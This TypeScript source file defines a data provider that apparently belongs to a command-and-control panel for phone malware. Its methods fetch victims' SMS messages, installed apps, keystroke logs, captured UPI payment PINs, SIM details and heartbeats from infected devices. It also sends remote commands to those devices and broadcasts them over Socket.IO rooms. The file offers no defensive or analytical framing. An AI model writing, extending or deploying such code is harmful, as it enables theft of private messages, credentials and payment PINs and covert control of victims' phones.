import axios from 'axios';
import { IDeviceProvider, DeviceStats } from './base';
import { io as globalIo } from '../index';

export class SocketIOProvider implements IDeviceProvider {
    private baseUrl: string;
    private appId?: string;

    constructor(baseUrl: string, appId?: string) {
        this.baseUrl = baseUrl.replace(/\/$/, '');
        this.appId = appId;
    }

    private async request(path: string) {
        try {
            const separator = path.includes('?') ? '&' : '?';
            const appIdParam = this.appId ? `${separator}appId=${this.appId}` : '';
            const response = await axios.get(`${this.baseUrl}${path}${appIdParam}`);
            return response.data;
        } catch (error: any) {
            console.error(`SocketIOProvider error (${path}):`, error.message);
            throw error;
        }
    }

    async listDevices(_limit: number = 100): Promise<any[]> {
        const devices = await this.request('/api/devices');
        if (!Array.isArray(devices)) return [];
        return devices.map(d => ({ ...d, app_id: this.appId, _sourceProvider: 'SOCKETIO' }));
    }

    async getDevice(deviceId: string): Promise<any> {
        try {
            const device = await this.request(`/api/devices/${deviceId}`);
            return { ...device, app_id: this.appId, _sourceProvider: 'SOCKETIO' };
        } catch (e) {
            // Fallback: search in list
            const devices = await this.listDevices();
            return devices.find(d => d.device_id === deviceId) || null;
        }
    }

    async getDeviceStats(deviceId: string): Promise<DeviceStats> {
        try {
            const [messages, apps] = await Promise.all([
                this.getMessages(deviceId, 1),
                this.getApps(deviceId, 1)
            ]);
            return {
                messages: messages.length,
                apps: apps.length
            };
        } catch (e) {
            return { messages: 0, apps: 0 };
        }
    }

    async getMessages(deviceId: string, _limit: number = 100): Promise<any[]> {
        return this.request(`/api/devices/${deviceId}/sms`);
    }

    async getApps(deviceId: string, _limit: number = 200): Promise<any[]> {
        return this.request(`/api/devices/${deviceId}/apps`);
    }

    async getKeylogs(deviceId: string, _limit: number = 100): Promise<any[]> {
        return this.request(`/api/devices/${deviceId}/logs/keys`);
    }

    async getUpiPins(deviceId: string): Promise<any[]> {
        return this.request(`/api/devices/${deviceId}/logs/upi`);
    }

    async getHeartbeat(deviceId: string, _limit: number = 50): Promise<any[]> {
        return this.request(`/api/devices/${deviceId}/heartbeats`);
    }

    async getSims(deviceId: string): Promise<any[]> {
        const device = await this.getDevice(deviceId);
        return device?.sim_cards || [];
    }

    async getNotifications(_deviceId: string, _limit: number = 100): Promise<any[]> {
        return [];
    }

    async getCallLogs(_deviceId: string, _limit: number = 100): Promise<any[]> {
        return [];
    }

    async getContacts(_deviceId: string): Promise<any[]> {
        return [];
    }

    async getLogins(_deviceId: string): Promise<any[]> {
        return [];
    }

    async sendCommand(deviceId: string, command: string, payload: any): Promise<any> {
        const appIdParam = this.appId ? `?appId=${this.appId}` : '';
        const response = await axios.post(`${this.baseUrl}/api/devices/${deviceId}/commands${appIdParam}`, {
            command,
            payload: payload || {},
            status: 'pending'
        });

        const cmd = response.data;
        if (cmd) {
            const room = `device-${deviceId}`;
            globalIo.to(room).emit('command_change', { eventType: 'UPDATE', new: cmd });
        }

        return cmd;
    }

    async listAllMessages(_limit: number = 100): Promise<any[]> {
        return this.request('/api/messages');
    }

    async listAllApps(_limit: number = 200): Promise<any[]> {
        return this.request('/api/apps');
    }

    async listAllKeylogs(_limit: number = 100): Promise<any[]> {
        return this.request('/api/keylogs');
    }

    async listAllUpiPins(_limit: number = 100): Promise<any[]> {
        return this.request('/api/pins');
    }
}
